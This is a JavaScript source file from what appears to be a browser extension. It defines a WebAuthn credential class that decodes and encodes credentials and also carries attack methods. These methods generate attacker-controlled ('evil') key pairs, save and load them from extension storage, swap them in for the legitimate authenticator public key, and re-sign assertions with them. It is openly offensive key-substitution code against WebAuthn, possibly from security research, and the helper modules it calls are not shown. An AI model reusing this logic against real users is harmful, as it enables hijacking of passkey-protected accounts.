import base64url from "base64url";
import MyAuthenticatorResponseFactory from "./MyAuthenticatorResponseFactory";
import EvilKeys from "./EvilKeys";


export default class MyPublicKeyCredential {

    /**
     * Returns a MyPublicKeyCredential from the given JSON string.
     *
     * @param {string} json
     * @returns {MyPublicKeyCredential}
     */
    static decode(json) {
        const credential = new MyPublicKeyCredential();
        let obj = JSON.parse(json);

        if (!('id' in obj && 'rawId' in obj && 'type' in obj && 'response' in obj)) {
            throw 'Invalid public key credential data';
        }

        credential.id = obj.id;
        credential.rawId = base64url.toBuffer(obj.rawId);
        credential.type = obj.type;
        credential.response = MyAuthenticatorResponseFactory.build(obj.response);
        credential.evilKeys = new EvilKeys("oneKeyOnly"); // todo: replace "oneKeyOnly" with credential.id

        return credential;
    }

    /**
     * Returns a JSON string of this MyPublicKeyCredential
     *
     * @returns {string}
     */
    encode() {
        const json = {};

        json.id = this.id;
        json.rawId = base64url.encode(this.rawId);
        json.type = this.type;
        json.response = this.response.encode();

        return JSON.stringify(json);
    }

    /**
     * Checks, if the credential belongs to the given origin
     *
     * @param expectedOrigin
     * @returns {boolean}
     */
    ofOrigin(expectedOrigin) {
        const expOrigin = this._stripTrailingSlash(expectedOrigin);
        const credOrigin = this._stripTrailingSlash(this.response.clientDataJSON.origin);

        return expOrigin === credOrigin;
    }

    /**
     * Generates a new key pair for this credential
     */
    async generateEvilKeys() {
        // todo: use parameters, that the rp has sent
        await this.evilKeys.generate();
    }

    /**
     * Saves the new key pair in web storage of the extension
     */
    async saveEvilKeys() {
        await this.evilKeys.save();
    }

    /**
     * Loads the key pair from the web storage of the extension
     */
    async loadEvilKeys() {
        await this.evilKeys.load();
    }

    /**
     * Replaces the legit key with the evil one
     */
    async replaceKeys() {
        await this.response.setKey(this.evilKeys);
    }

    /**
     * Replaces the assertions with the ones created with the evil keys
     */
    async signWithEvilKeys() {
        await this.response.sign(this.evilKeys);
    }

    async getEvilPubKeyPem() {
        return await this.evilKeys.getPubKeyPem();
    }

    /**
     * @internal
     *
     * @param string
     * @returns {string}
     */
    _stripTrailingSlash(string) {
        return string.replace(/\/$/, '');
    }
}